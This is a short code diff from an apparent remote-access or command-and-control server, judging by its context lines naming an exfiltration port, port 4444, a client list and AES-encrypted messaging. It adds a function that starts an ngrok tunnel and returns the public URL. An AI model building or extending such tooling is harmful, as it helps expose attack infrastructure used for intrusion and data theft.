@@ -10,6 +10,20 @@ PORT = 4444
 EXFIL_PORT = 9090
 clients = []
 
+def start_ngrok(port=8000):
+    import subprocess, time, requests
+    subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.DEVNULL)
+    time.sleep(3)  # Give ngrok time to connect
+    try:
+        r = requests.get("http://localhost:4040/api/tunnels")
+        data = r.json()
+        for tunnel in data["tunnels"]:
+            if tunnel["proto"] == "https":
+                return tunnel["public_url"]
+    except Exception as e:
+        print(f"[!] Ngrok failed: {e}")
+        return None
+
 def encrypt_message(msg):
     cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
     ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
